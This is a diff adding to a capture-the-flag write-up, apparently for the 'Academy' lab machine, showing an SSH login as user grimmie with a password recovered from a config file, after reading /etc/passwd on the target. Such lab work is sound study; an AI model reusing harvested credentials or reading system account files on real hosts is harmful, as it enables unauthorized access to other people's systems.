@@ -488,4 +488,30 @@ $bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_datab
 When we go to cat /etc/passwd we see the user grimmie......
 ... Hence, there is a user grimmie and we can try the "My_V3ryS3cur3_P4ss" to access via ssh
 
+Here is the result:
+
+```
+┌──(root㉿kali)-[~]
+└─# ssh grimmie@192.168.64.3
+The authenticity of host '192.168.64.3 (192.168.64.3)' can't be established.
+ED25519 key fingerprint is SHA256:eeNKTTakhvXyaWVPMDTB9+/4WEg6WKZwlUp0ATptgb0.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.64.3' (ED25519) to the list of known hosts.
+grimmie@192.168.64.3's password: 
+Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun May 30 03:21:39 2021 from 192.168.10.31
+grimmie@academy:~$ 
+
+```
+
+
+![[Pasted image 20240706015231.png]]
 
